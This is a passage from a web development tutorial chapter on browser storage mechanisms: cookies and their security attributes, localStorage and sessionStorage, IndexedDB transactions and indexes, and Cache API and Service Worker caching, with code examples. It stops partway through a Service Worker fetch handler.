# Web Storage

> Systematically understand the multiple storage mechanisms available in browsers (Cookie, localStorage, sessionStorage, IndexedDB, Cache API), and become able to make optimal choices based on use case, capacity, and security requirements.

## Prerequisites

It is recommended to have acquired the following knowledge before studying this chapter.

- **Browser Security Model** ([../00-browser-engine/03-browser-security-model.md](../00-browser-engine/03-browser-security-model.md)): Web storage is protected by the Same-Origin Policy. Understanding the concept of origins (scheme + host + port), attack methods such as XSS (Cross-Site Scripting) and CSRF (Cross-Site Request Forgery), and how browsers defend against them is assumed.
- **Understanding Same-Origin Policy**: Storage scope is always isolated per origin. `https://example.com:443` and `https://example.com:8080` are treated as separate origins, and their storage is completely independent. Without understanding this isolation mechanism, it is easy to be confused about Cookie domain settings and cross-origin communication using postMessage().
- **Handling JSON Data**: Since localStorage/sessionStorage can only store strings, you need to use `JSON.stringify()` and `JSON.parse()` when storing objects and arrays. Understanding the constraints of JSON serialization/deserialization (functions and undefined are lost, circular references cause errors, etc.) helps avoid pitfalls during implementation.

Having this foundational knowledge allows for a deeper understanding of the reasons for storage selection and security constraints.

---

## What You Will Learn

- [ ] Accurately understand the internal workings and capacity limits of each storage mechanism
- [ ] Apply storage selection criteria based on use case to design decisions
- [ ] Implement IndexedDB transactions, indexes, and version management
- [ ] Correctly configure Cookie security attributes (HttpOnly, Secure, SameSite)
- [ ] Incorporate capacity monitoring and persistence requests via the Storage API into operations
- [ ] Avoid representative bugs and security risks related to storage

---

## 1. Overview of Browser Storage

### 1.1 Why Multiple Storage Mechanisms Exist

Throughout the history of the Web, the demand to store data on the client side has gradually expanded.
Initially, Cookie was the only means of persistence, but the constraints of capacity (4KB) and
automatic transmission to servers led to the demand for larger-capacity, client-only storage.
As a result, the Web Storage API (localStorage / sessionStorage) was standardized in HTML5,
and later the IndexedDB for structured data and the Cache API for caching entire HTTP responses were added.

Each storage mechanism forms a "complementary hierarchy" rather than an "exclusive competition."

```
┌─────────────────────────────────────────────────────────────────┐
│                    Browser Storage Hierarchy                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐   Capacity: ~4KB / domain                      │
│  │   Cookie     │   Feature: Automatically attached to HTTP requests│
│  │  (RFC 6265)  │   Use case: Auth tokens, session management   │
│  └──────┬──────┘                                                │
│         │                                                       │
│  ┌──────▼──────┐   Capacity: 5-10MB / origin                    │
│  │ Web Storage │   Feature: Synchronous API, strings only       │
│  │ localStorage│   Use case: User settings, theme, small cache  │
│  │ sessionStr. │   Use case: Temp form save, in-tab state       │
│  └──────┬──────┘                                                │
│         │                                                       │
│  ┌──────▼──────┐   Capacity: Hundreds of MB to GB              │
│  │  IndexedDB  │   Feature: Async API, structured data, indexes │
│  │             │   Use case: Offline DB, large records, binary  │
│  └──────┬──────┘                                                │
│         │                                                       │
│  ┌──────▼──────┐   Capacity: Hundreds of MB to GB              │
│  │  Cache API  │   Feature: Request/Response pairs, SW integration│
│  │             │   Use case: Offline resources, API response cache│
│  └─────────────┘                                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Comprehensive Comparison Table of Storage Mechanisms

The following table compares the five storage mechanisms from key perspectives.

```
┌──────────────────┬──────────┬─────────────┬──────────────┬────────────┬────────────┐
│     Aspect       │  Cookie  │ localStorage│sessionStorage│ IndexedDB  │ Cache API  │
├──────────────────┼──────────┼─────────────┼──────────────┼────────────┼────────────┤
│ Max Capacity     │ 4KB      │ 5-10MB      │ 5-10MB       │ GB-scale   │ GB-scale   │
│ Data format      │ String   │ String      │ String       │ Structured │ Req/Res    │
│ API type         │ Sync     │ Sync        │ Sync         │ Async      │ Async      │
│ Lifetime         │ Settable │ Persistent  │ Until tab close│ Persistent│ Persistent │
│ Server send      │ Auto     │ None        │ None         │ None       │ None       │
│ Web Worker       │ No       │ No          │ No           │ Yes        │ Yes        │
│ Service Worker   │ No       │ No          │ No           │ Yes        │ Yes        │
│ Transactions     │ None     │ None        │ None         │ Yes        │ None       │
│ Index search     │ No       │ No          │ No           │ Yes        │ URL-based  │
│ Same-origin      │ Domain   │ Origin      │ Origin       │ Origin     │ Origin     │
│ XSS read access  │ *cond.   │ Yes         │ Yes          │ Yes        │ Yes        │
│ CSRF risk        │ Yes      │ No          │ No           │ No         │ No         │
│ Standard         │ RFC 6265 │ HTML LS     │ HTML LS      │ W3C        │ W3C        │
│ Browser support  │ All      │ All         │ All          │ All        │ All        │
└──────────────────┴──────────┴─────────────┴──────────────┴────────────┴────────────┘
* Cookie reading from JavaScript can be prevented by setting the HttpOnly attribute
```

### 1.3 Relationship Between Origins and Storage

Storage scope is determined by the "origin" (scheme + host + port).

```
Origin = scheme://host:port

https://example.com:443    ─── Origin A
https://example.com:8080   ─── Origin B (different port)
http://example.com:80      ─── Origin C (different scheme)
https://sub.example.com    ─── Origin D (different host)

Each origin has its own independent storage space:

  Origin A's localStorage  ≠  Origin B's localStorage
  Origin A's IndexedDB     ≠  Origin C's IndexedDB

Exception: Cookies have domain-based scope, so setting
           domain=.example.com allows sharing across subdomains.
```

---

## 2. Cookie in Detail

### 2.1 How Cookies Work and Their History

Cookie was invented in 1994 by Lou Montulli of Netscape to add state to HTTP.
It is now standardized in RFC 6265.
Because HTTP itself is a stateless protocol, cookies were essential for identifying
users across requests.

The basic flow of a Cookie is as follows.

```
┌──────────┐                         ┌──────────┐
│ Browser   │                         │ Server   │
└────┬─────┘                         └────┬─────┘
     │  1. GET /login                     │
     │ ──────────────────────────────────> │
     │                                    │
     │  2. Set-Cookie: sid=abc123;        │
     │     HttpOnly; Secure; SameSite=Lax │
     │ <────────────────────────────────── │
     │                                    │
     │  3. GET /dashboard                 │
     │     Cookie: sid=abc123             │
     │ ──────────────────────────────────> │
     │                                    │
     │  4. 200 OK (Authenticated content) │
     │ <────────────────────────────────── │
     │                                    │
```

### 2.2 List of Cookie Attributes

```javascript
// Cookie attributes set on the server side
// Set-Cookie: name=value; attribute1; attribute2; ...

// List of attributes and descriptions:

// Expires / Max-Age: Expiration date
// Expires=Thu, 01 Dec 2025 00:00:00 GMT  — Absolute datetime
// Max-Age=86400                          — Specified in seconds (takes precedence)
// Neither specified → Session Cookie (deleted when browser is closed)

// Domain: Domain range for sending
// Domain=.example.com → Sent to example.com and all subdomains
// Not specified → Only the originating host (not sent to subdomains)

// Path: Path range for sending
// Path=/ → Sent to all paths
// Path=/api → Sent only to paths under /api

// Secure: Only sent over HTTPS connections
// HttpOnly: Not accessible from document.cookie in JavaScript
// SameSite: Controls sending in cross-site requests
//   Strict — Completely blocked (not sent even from link navigation)
//   Lax    — Allows only GET top-level navigation (default)
//   None   — Allows all (Secure is required)
```

### 2.3 Cookie Operations — Server Side and Client Side

```javascript
// ===== Server side (Node.js / Express example) =====

// Setting a Cookie
app.get('/login', (req, res) => {
  const sessionId = generateSecureSessionId();

  res.cookie('sid', sessionId, {
    httpOnly: true,     // XSS protection: not accessible from JS
    secure: true,       // HTTPS only
    sameSite: 'lax',    // CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24 hours (milliseconds)
    path: '/',
    domain: '.example.com',
  });

  res.redirect('/dashboard');
});

// Reading a Cookie (using cookie-parser middleware)
app.get('/dashboard', (req, res) => {
  const sessionId = req.cookies.sid;
  if (!sessionId || !isValidSession(sessionId)) {
    return res.redirect('/login');
  }
  res.render('dashboard');
});

// Deleting a Cookie
app.post('/logout', (req, res) => {
  res.clearCookie('sid', {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
    domain: '.example.com',
  });
  res.redirect('/');
});


// ===== Client side =====

// Reading (only those without HttpOnly)
function parseCookies() {
  return document.cookie
    .split('; ')
    .reduce((acc, pair) => {
      const [key, ...valueParts] = pair.split('=');
      acc[key] = decodeURIComponent(valueParts.join('='));
      return acc;
    }, {});
}

const cookies = parseCookies();
console.log(cookies.theme); // 'dark'

// Writing
function setCookie(name, value, options = {}) {
  let cookieString = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;

  if (options.maxAge) cookieString += `; max-age=${options.maxAge}`;
  if (options.path)   cookieString += `; path=${options.path}`;
  if (options.domain) cookieString += `; domain=${options.domain}`;
  if (options.secure) cookieString += '; secure';
  if (options.sameSite) cookieString += `; samesite=${options.sameSite}`;

  document.cookie = cookieString;
}

setCookie('theme', 'dark', { maxAge: 86400 * 30, path: '/' });

// Deleting
function deleteCookie(name, path = '/') {
  document.cookie = `${name}=; max-age=0; path=${path}`;
}

deleteCookie('theme');
```

### 2.4 Security Notes for Cookies

Cookie is the storage mechanism that requires the most security attention.

| Attack method | Risk | Countermeasure |
|--------------|------|----------------|
| XSS (Cross-Site Scripting) | Session ID theft via `document.cookie` | Set `HttpOnly` attribute |
| CSRF (Cross-Site Request Forgery) | Sending unintended requests by the user | `SameSite=Lax` or `Strict` |
| Man-in-the-middle attack (MITM) | Cookie theft via eavesdropping | `Secure` attribute + HSTS |
| Cookie Tossing | Cookie overwrite from subdomain | `__Host-` prefix |
| Session fixation attack | Logging in with an attacker-specified session ID | Regenerate session ID on login |

```javascript
// Recommended: Robust Cookie with __Host- prefix

// Constraints of the __Host- prefix:
// 1. Secure attribute is required
// 2. Path=/ is required
// 3. Domain attribute must NOT be specified
// → Prevents overwriting from subdomains

// Set-Cookie: __Host-sid=abc123; Secure; Path=/; HttpOnly; SameSite=Lax

// Constraints of the __Secure- prefix:
// 1. Only Secure attribute is required
// → Domain specification is allowed

// Set-Cookie: __Secure-token=xyz; Secure; Domain=.example.com; Path=/
```

---

## 3. Web Storage API (localStorage / sessionStorage)

### 3.1 Specification and Internal Behavior

The Web Storage API is a synchronous key-value store defined in the HTML Living Standard.
localStorage and sessionStorage implement the same interface (`Storage`), but
their lifecycles and scopes differ.

```
┌──────────────────────────────────────────────────────────────┐
│           Web Storage Scope Comparison                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  localStorage:                                               │
│  ┌──────────────────────────────────────┐                    │
│  │       Origin: https://app.com        │                    │
│  │  ┌────────┐ ┌────────┐ ┌────────┐   │                    │
│  │  │ Tab A  │ │ Tab B  │ │ Tab C  │   │  Shared across all tabs
│  │  └───┬────┘ └───┬────┘ └───┬────┘   │  Data persists after
│  │      └──────────┴──────────┘        │  browser is closed
│  │          Shared storage space        │                    │
│  └──────────────────────────────────────┘                    │
│                                                              │
│  sessionStorage:                                             │
│  ┌──────────────────────────────────────┐                    │
│  │       Origin: https://app.com        │                    │
│  │  ┌────────┐ ┌────────┐ ┌────────┐   │                    │
│  │  │ Tab A  │ │ Tab B  │ │ Tab C  │   │  Independent per tab
│  │  │ [own]  │ │ [own]  │ │ [own]  │   │  Data is lost when
│  │  └────────┘ └────────┘ └────────┘   │  tab is closed
│  └──────────────────────────────────────┘                    │
│                                                              │
│  Note: When duplicating a tab or opening a link in a         │
│        new tab, sessionStorage contents are copied            │
│        (not shared — they are independent copies)             │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 3.2 Basic Operations

```javascript
// ===== Basic operations for localStorage =====

// 1. Saving a value
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');
localStorage.setItem('fontSize', '16');

// 2. Getting a value
const theme = localStorage.getItem('theme');      // 'dark'
const missing = localStorage.getItem('unknown');   // null

// 3. Removing a value
localStorage.removeItem('fontSize');

// 4. Deleting all data
localStorage.clear();

// 5. Enumerating keys
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}

// 6. Property access (not recommended but works)
localStorage.theme = 'light';        // Equivalent to setItem
const t = localStorage.theme;        // Equivalent to getItem
delete localStorage.theme;           // Equivalent to removeItem
// Note: May conflict with reserved names like 'length', 'key', 'getItem'


// ===== sessionStorage uses the exact same API =====
sessionStorage.setItem('formStep', '2');
const step = sessionStorage.getItem('formStep');
```

### 3.3 Storing Objects and a Type-Safe Wrapper

Since localStorage can only store strings, JSON serialization is required to handle objects.
Implement a type-safe and robust wrapper.

```typescript
// ===== Type-safe Storage wrapper =====

interface StorageSchema {
  theme: 'light' | 'dark';
  language: string;
  userPreferences: {
    fontSize: number;
    sidebarOpen: boolean;
    recentPages: string[];
  };
  lastVisit: string; // ISO 8601
}

class TypedStorage<T extends Record<string, unknown>> {
  private storage: Storage;
  private prefix: string;

  constructor(storage: Storage, prefix: string = '') {
    this.storage = storage;
    this.prefix = prefix;
  }

  get<K extends keyof T>(key: K): T[K] | null {
    const raw = this.storage.getItem(this.prefix + String(key));
    if (raw === null) return null;

    try {
      return JSON.parse(raw) as T[K];
    } catch {
      // Return the string as-is if JSON parse fails
      return raw as unknown as T[K];
    }
  }

  set<K extends keyof T>(key: K, value: T[K]): void {
    try {
      const serialized = JSON.stringify(value);
      this.storage.setItem(this.prefix + String(key), serialized);
    } catch (e) {
      if (e instanceof DOMException && e.name === 'QuotaExceededError') {
        console.error('Storage quota exceeded. Consider cleaning old data.');
        this.evictOldEntries();
        // Retry
        const serialized = JSON.stringify(value);
        this.storage.setItem(this.prefix + String(key), serialized);
      } else {
        throw e;
      }
    }
  }

  remove<K extends keyof T>(key: K): void {
    this.storage.removeItem(this.prefix + String(key));
  }

  has<K extends keyof T>(key: K): boolean {
    return this.storage.getItem(this.prefix + String(key)) !== null;
  }

  private evictOldEntries(): void {
    // Simple eviction strategy: delete old entries when storage is full
    const keysToRemove: string[] = [];
    for (let i = 0; i < this.storage.length; i++) {
      const key = this.storage.key(i);
      if (key && key.startsWith(this.prefix)) {
        keysToRemove.push(key);
      }
    }
    // Remove the first 1/4
    const removeCount = Math.ceil(keysToRemove.length / 4);
    for (let i = 0; i < removeCount; i++) {
      this.storage.removeItem(keysToRemove[i]);
    }
  }
}

// Usage example
const appStorage = new TypedStorage<StorageSchema>(localStorage, 'app_');

appStorage.set('theme', 'dark');
appStorage.set('userPreferences', {
  fontSize: 14,
  sidebarOpen: true,
  recentPages: ['/home', '/settings'],
});

const theme = appStorage.get('theme');         // 'light' | 'dark' | null
const prefs = appStorage.get('userPreferences'); // Type inference works
```

### 3.4 Cross-Tab Sync via the storage Event

Changes to localStorage are notified to other tabs of the same origin as a `storage` event.
This can be used to achieve real-time synchronization between tabs.

```javascript
// ===== Using the storage event =====

// Note: The storage event fires in "tabs other than the one making the change"
// In other words, it does NOT fire in your own tab

window.addEventListener('storage', (event) => {
  // event.key       — Key that was changed (null if clear() was called)
  // event.oldValue  — Value before the change
  // event.newValue  — Value after the change (null if remove was called)
  // event.url       — URL of the page where the change was made
  // event.storageArea — localStorage or sessionStorage

  if (event.key === 'theme') {
    applyTheme(event.newValue);
  }

  if (event.key === 'auth_logout') {
    // If logged out in another tab, log out here too
    window.location.href = '/login';
  }

  if (event.key === null) {
    // clear() was called
    console.log('Storage was cleared in another tab');
  }
});


// ===== Comparison with BroadcastChannel =====

// Limitations of the storage event:
// - Communication only through localStorage changes
// - Not suitable for ephemeral message passing

// BroadcastChannel: Dedicated API for inter-tab messaging
const channel = new BroadcastChannel('app_sync');

// Send (reaches all tabs)
channel.postMessage({ type: 'THEME_CHANGED', theme: 'dark' });

// Receive
channel.onmessage = (event) => {
  if (event.data.type === 'THEME_CHANGED') {
    applyTheme(event.data.theme);
  }
};

// Close when no longer needed
channel.close();
```

### 3.5 Capacity Limits and QuotaExceededError

```javascript
// ===== Testing capacity limits and handling them =====

// Function to check localStorage usage
function getStorageUsage(storage = localStorage) {
  let total = 0;
  for (let i = 0; i < storage.length; i++) {
    const key = storage.key(i);
    if (key) {
      // UTF-16 encoding: 1 character = 2 bytes
      total += (key.length + storage.getItem(key).length) * 2;
    }
  }
  return {
    bytes: total,
    kb: (total / 1024).toFixed(2),
    mb: (total / 1024 / 1024).toFixed(4),
  };
}

console.log(getStorageUsage());
// { bytes: 2048, kb: '2.00', mb: '0.0020' }


// Handling QuotaExceededError
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
    return true;
  } catch (e) {
    if (e instanceof DOMException) {
      switch (e.name) {
        case 'QuotaExceededError':
          console.warn('localStorage is full. Attempting cleanup...');
          // Delete old cache and retry
          cleanupExpiredCache();
          try {
            localStorage.setItem(key, value);
            return true;
          } catch {
            console.error('Still full after cleanup. Data not saved.');
            return false;
          }
        case 'SecurityError':
          // Private browsing or iframe restrictions
          console.error('Storage access denied.');
          return false;
        default:
          throw e;
      }
    }
    throw e;
  }
}

function cleanupExpiredCache() {
  const now = Date.now();
  const keysToDelete = [];

  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key && key.startsWith('cache_')) {
      try {
        const item = JSON.parse(localStorage.getItem(key));
        if (item.expiresAt && item.expiresAt < now) {
          keysToDelete.push(key);
        }
      } catch {
        keysToDelete.push(key); // Items that can't be parsed are also deletion targets
      }
    }
  }

  keysToDelete.forEach(key => localStorage.removeItem(key));
  console.log(`Cleaned up ${keysToDelete.length} expired cache entries.`);
}
```

---

## 4. IndexedDB in Detail

### 4.1 IndexedDB Design Philosophy

IndexedDB is a low-level API for handling large amounts of structured data in the browser.
Unlike relational databases, it adopts an object-oriented data model and
supports primary keys via key paths and searches via indexes.

The main features are as follows.

1. **Asynchronous API**: Does not block the main thread
2. **Transactions**: Guarantees some ACID properties (Atomicity and Isolation)
3. **Structured cloning**: Objects, arrays, Date, Blob, ArrayBuffer, etc. can be stored directly
4. **Indexes**: Efficient searching on arbitrary properties
5. **Version management**: Built-in schema migration mechanism
6. **Large capacity**: Depends on the browser's available disk space (typically GB-scale)

```
┌────────────────────────────────────────────────────────────┐
│                IndexedDB Structure                          │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Database: "myApp" (version: 3)                            │
│  ├── ObjectStore: "users"                                  │
│  │   ├── keyPath: "id"                                     │
│  │   ├── Index: "email" (unique: true)                     │
│  │   ├── Index: "age"                                      │
│  │   ├── Record: { id: 1, name: "Alice", email: "...", }  │
│  │   ├── Record: { id: 2, name: "Bob",   email: "...", }  │
│  │   └── Record: { id: 3, name: "Carol", email: "...", }  │
│  │                                                         │
│  ├── ObjectStore: "products"                               │
│  │   ├── keyPath: "sku"                                    │
│  │   ├── Index: "category"                                 │
│  │   ├── Index: "price"                                    │
│  │   └── Records: ...                                      │
│  │                                                         │
│  └── ObjectStore: "orders"                                 │
│      ├── autoIncrement: true                               │
│      ├── Index: "userId"                                   │
│      ├── Index: "date"                                     │
│      └── Records: ...                                      │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 4.2 Basic Operations with the Native API

```javascript
// ===== Complete example of the native IndexedDB API =====

// --- Opening a database and defining the schema ---

function openDatabase() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open('TaskManager', 2);

    // Called when the version increases (or when the DB is newly created)
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      const oldVersion = event.oldVersion;

      // Version 0 → 1: Initial schema
      if (oldVersion < 1) {
        const taskStore = db.createObjectStore('tasks', {
          keyPath: 'id',
          autoIncrement: true,
        });
        taskStore.createIndex('status', 'status', { unique: false });
        taskStore.createIndex('dueDate', 'dueDate', { unique: false });
        taskStore.createIndex('priority', 'priority', { unique: false });
      }

      // Version 1 → 2: Add category
      if (oldVersion < 2) {
        // Add index to existing ObjectStore
        const taskStore = event.target.transaction.objectStore('tasks');
        taskStore.createIndex('category', 'category', { unique: false });

        // Add new ObjectStore
        db.createObjectStore('categories', { keyPath: 'name' });
      }
    };

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    // When database deletion or version upgrade is performed in another tab
    request.onblocked = () => {
      console.warn('Database upgrade blocked. Close other tabs.');
    };
  });
}


// --- CRUD operations ---

async function addTask(task) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');
    const request = store.add(task);

    request.onsuccess = () => resolve(request.result); // Generated ID
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

async function getTask(id) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const request = store.get(id);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

async function updateTask(task) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');
    const request = store.put(task); // put = upsert

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

async function deleteTask(id) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');
    const request = store.delete(id);

    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}


// --- Search using indexes ---

async function getTasksByStatus(status) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const index = store.index('status');
    const request = index.getAll(status);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}

// Range search (IDBKeyRange)
async function getTasksDueBefore(date) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const index = store.index('dueDate');

    // upperBound: at most the specified value; true to exclude the specified value
    const range = IDBKeyRange.upperBound(date.toISOString(), false);
    const request = index.getAll(range);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);

    tx.oncomplete = () => db.close();
  });
}


// --- Sequential processing with a cursor ---

async function processAllTasks(callback) {
  const db = await openDatabase();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('tasks', 'readonly');
    const store = tx.objectStore('tasks');
    const request = store.openCursor();
    const results = [];

    request.onsuccess = (event) => {
      const cursor = event.target.result;
      if (cursor) {
        results.push(callback(cursor.value));
        cursor.continue(); // Move to the next record
      } else {
        resolve(results); // All records processed
      }
    };

    request.onerror = () => reject(request.error);
    tx.oncomplete = () => db.close();
  });
}

// Usage example
const taskIds = await addTask({
  title: 'Write report',
  status: 'pending',
  priority: 'high',
  category: 'work',
  dueDate: '2025-12-31',
});
console.log('Created task with ID:', taskIds);

const pendingTasks = await getTasksByStatus('pending');
console.log('Pending tasks:', pendingTasks);
```

### 4.3 Concise Operations with the idb Library

The native IndexedDB API is callback-based and tends to be verbose.
The `idb` library developed by Jake Archibald provides a thin Promise-based wrapper,
greatly improving code readability.

```javascript
// ===== Usage example of the idb library =====

import { openDB, deleteDB } from 'idb';

// --- Opening the database ---
const db = await openDB('TaskManager', 2, {
  upgrade(db, oldVersion, newVersion, transaction) {
    if (oldVersion < 1) {
      const taskStore = db.createObjectStore('tasks', {
        keyPath: 'id',
        autoIncrement: true,
      });
      taskStore.createIndex('status', 'status');
      taskStore.createIndex('dueDate', 'dueDate');
      taskStore.createIndex('priority', 'priority');
    }
    if (oldVersion < 2) {
      const taskStore = transaction.objectStore('tasks');
      taskStore.createIndex('category', 'category');
      db.createObjectStore('categories', { keyPath: 'name' });
    }
  },
  blocked() {
    console.warn('Database upgrade blocked by another tab.');
  },
  blocking() {
    // When this tab is using an old version
    db.close();
    console.warn('Database outdated. Please reload.');
  },
  terminated() {
    console.error('Database connection was unexpectedly terminated.');
  },
});

// --- CRUD (remarkably simple) ---

// Create
const id = await db.add('tasks', {
  title: 'Design review',
  status: 'pending',
  priority: 'high',
  category: 'work',
  dueDate: '2025-06-30',
  createdAt: new Date().toISOString(),
});

// Read
const task = await db.get('tasks', id);
const allTasks = await db.getAll('tasks');

// Update
task.status = 'in-progress';
await db.put('tasks', task);

// Delete
await db.delete('tasks', id);

// --- Search by index ---
const pendingTasks2 = await db.getAllFromIndex('tasks', 'status', 'pending');
const highPriority = await db.getAllFromIndex('tasks', 'priority', 'high');

// Range search
const dueSoon = await db.getAllFromIndex(
  'tasks',
  'dueDate',
  IDBKeyRange.upperBound('2025-07-01')
);

// --- Transactions ---
const tx = db.transaction(['tasks', 'categories'], 'readwrite');
const taskStore = tx.objectStore('tasks');
const catStore = tx.objectStore('categories');

await Promise.all([
  taskStore.add({ title: 'New Task', status: 'pending', category: 'dev' }),
  catStore.put({ name: 'dev', color: '#3b82f6' }),
  tx.done,
]);

// --- Deleting the database ---
await deleteDB('TaskManager');
```

### 4.4 IndexedDB Transaction Details

IndexedDB transactions have the following characteristics.

```
┌─────────────────────────────────────────────────────────────┐
│            IndexedDB Transaction Characteristics             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Modes:                                                     │
│  ┌──────────────┬───────────────────────────────────────┐   │
│  │ readonly     │ Read-only. Multiple can run concurrently│  │
│  │ readwrite    │ Read-write. Concurrent readwrite to    │   │
│  │              │ the same ObjectStore are serialized    │   │
│  │ versionchange│ Schema changes only. Inside onupgradeneeded│
│  └──────────────┴───────────────────────────────────────┘   │
│                                                             │
│  Lifecycle:                                                 │
│  ┌─────────┐    ┌─────────┐    ┌──────────┐               │
│  │ active  │───>│committing│───>│ finished │               │
│  └────┬────┘    └─────────┘    └──────────┘               │
│       │                                                     │
│       │ (error occurs)                                      │
│       ▼                                                     │
│  ┌─────────┐                                               │
│  │ aborted │  All operations are rolled back               │
│  └─────────┘                                               │
│                                                             │
│  Important constraints:                                     │
│  - If you insert await-based async processing inside        │
│    a transaction, the transaction will auto-commit          │
│  - Async processing like fetch(), setTimeout() should       │
│    be done outside the transaction                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

```javascript
// ===== Transaction notes =====

// Correct example: All operations run within the same microtask
async function transferTask(taskId, fromCategory, toCategory) {
  const db = await openDB('TaskManager', 2);
  const tx = db.transaction(['tasks', 'categories'], 'readwrite');

  const task = await tx.objectStore('tasks').get(taskId);
  task.category = toCategory;

  // Submit all operations before tx.done
  await Promise.all([
    tx.objectStore('tasks').put(task),
    tx.objectStore('categories').put({ name: toCategory, count: 1 }),
    tx.done,
  ]);
}


// Incorrect example: External async processing inside a transaction
async function badExample(taskId) {
  const db = await openDB('TaskManager', 2);
  const tx = db.transaction('tasks', 'readwrite');

  const task = await tx.objectStore('tasks').get(taskId);

  // BAD: Inserting fetch auto-commits the transaction
  const response = await fetch(`/api/tasks/${taskId}/details`);
  const details = await response.json();

  // At this point the transaction has already completed, so this causes an error
  task.details = details;
  await tx.objectStore('tasks').put(task); // TransactionInactiveError!
}
```

### 4.5 Storing Binary Data in IndexedDB

Because IndexedDB uses the structured clone algorithm,
Blob and ArrayBuffer can be stored directly.

```javascript
// ===== Storing and retrieving binary data =====

// Saving an image file
async function saveImage(imageFile) {
  const db = await openDB('MediaDB', 1, {
    upgrade(db) {
      db.createObjectStore('images', { keyPath: 'id' });
    },
  });

  await db.put('images', {
    id: `img_${Date.now()}`,
    name: imageFile.name,
    type: imageFile.type,
    size: imageFile.size,
    blob: imageFile,  // Store File/Blob directly
    savedAt: new Date().toISOString(),
  });
}

// Retrieving and displaying an image
async function loadImage(imageId) {
  const db = await openDB('MediaDB', 1);
  const record = await db.get('images', imageId);

  if (record) {
    const url = URL.createObjectURL(record.blob);
    const img = document.createElement('img');
    img.src = url;
    img.onload = () => URL.revokeObjectURL(url); // Prevent memory leak
    document.body.appendChild(img);
  }
}


// Saving an ArrayBuffer (audio data, etc.)
async function saveAudioBuffer(audioBuffer) {
  const db = await openDB('MediaDB', 1);

  // Convert AudioBuffer to Float32Array
  const channelData = [];
  for (let i = 0; i < audioBuffer.numberOfChannels; i++) {
    channelData.push(audioBuffer.getChannelData(i));
  }

  await db.put('images', {
    id: `audio_${Date.now()}`,
    type: 'audio',
    sampleRate: audioBuffer.sampleRate,
    numberOfChannels: audioBuffer.numberOfChannels,
    length: audioBuffer.length,
    channels: channelData,  // Store Float32Array directly
  });
}
```

---

## 5. Cache API Overview

### 5.1 The Role of the Cache API

The Cache API is an API for caching HTTP responses in conjunction with Service Workers.
Unlike regular Web Storage, it is characterized by storing Request/Response pairs.

```javascript
// ===== Basic Cache API operations =====

// Open a cache (create if it doesn't exist)
const cache = await caches.open('v1-static');

// Add a response to the cache
await cache.add('/styles/main.css');
await cache.addAll([
  '/scripts/app.js',
  '/images/logo.png',
  '/fonts/inter.woff2',
]);

// Save a custom response
const response = await fetch('/api/config');
await cache.put('/api/config', response.clone());

// Retrieve from cache
const cached = await cache.match('/styles/main.css');
if (cached) {
  const css = await cached.text();
  console.log('Cached CSS:', css.substring(0, 100));
}

// Delete from cache
await cache.delete('/api/config');

// List of cache names
const cacheNames = await caches.keys();
console.log('Caches:', cacheNames); // ['v1-static', 'v1-api']

// Delete old caches (version management)
const currentCaches = ['v2-static', 'v2-api'];
for (const name of await caches.keys()) {
  if (!currentCaches.includes(name)) {
    await caches.delete(name);
    console.log(`Deleted old cache: ${name}`);
  }
}
```

### 5.2 Cache Strategies in Service Worker

```javascript
// ===== Cache strategies inside a Service Worker =====

// sw.js

const CACHE_NAME = 'v2-app';
const STATIC_ASSETS = [
  '/',
  '/index.html',
  '/styles/main.css',
  '/scripts/app.js',
  '/images/logo.png',
];

// Pre-cache static resources on install
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(STATIC_ASSETS))
  );
  self.skipWaiting();
});

// Delete old caches on activation
self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then(names =>
      Promise.all(
        names
          .filter(name => name !== CACHE_NAME)
          .map(name => caches.delete(name))
      )
    )
  );
  self.clients.claim();
});

// Cache strategy on fetch
self.addEventListener('fetch', (event) => {
  const { request } = event;
  const url = new URL(request.url);

  if (url.pathname.startsWith('/api/')) {
    // API requests: Network First (Stale-While-Revalidate)
